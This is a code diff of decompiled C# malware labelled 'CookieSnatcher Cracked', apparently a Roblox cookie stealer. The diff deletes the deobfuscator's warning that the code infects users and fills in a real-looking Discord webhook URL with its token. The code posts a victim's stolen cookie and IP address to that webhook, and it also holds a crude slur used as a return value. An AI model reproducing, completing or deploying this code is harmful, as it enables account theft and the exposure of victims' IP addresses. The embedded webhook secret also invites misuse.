@@ -64,7 +64,7 @@ internal class EntryPointClass
 	// Token: 0x06000004 RID: 4 RVA: 0x00002428 File Offset: 0x00000628
 	private static void Main(string[] args)
 	{
-		MessageBox.Show("Dumped by icor, deobfuscated by NTAuth. Entry point reached, dont go further if you dont want to get fucking infected by this sloppy code.");
+		MessageBox.Show("Dumped by icor, deobfuscated by NTAuth. Entry point reached.");
 		EntryPointClass.smethod_5();
 		string text = Path.Combine(EntryPointClass.smethod_6(), "content", "updates");
 		string text2 = Path.Combine(text, "RobloxPlayerLauncher.exe");
@@ -504,7 +504,7 @@ internal class EntryPointClass
 			{
 				dcWeb.ProfilePicture = "https://ixware.biz/cs/cs.png";
 				dcWeb.UserName = "CookieSnatcher Cracked";
-				dcWeb.WebHook = "WEBHOOK HERE";
+				dcWeb.WebHook = "https://discord.com/api/webhooks/844709443648356443/KGghJmCiGxEyXrfN4ylhsqQlaO3e04Tl470hizGvL-dzArs8Ojf_NAEx43g6g4ID1AWO";
 				dcWeb.SendMessage($"Cookie: {string_8}\r\n\r\nIP: {value}");
 			}
 			result = "gay";
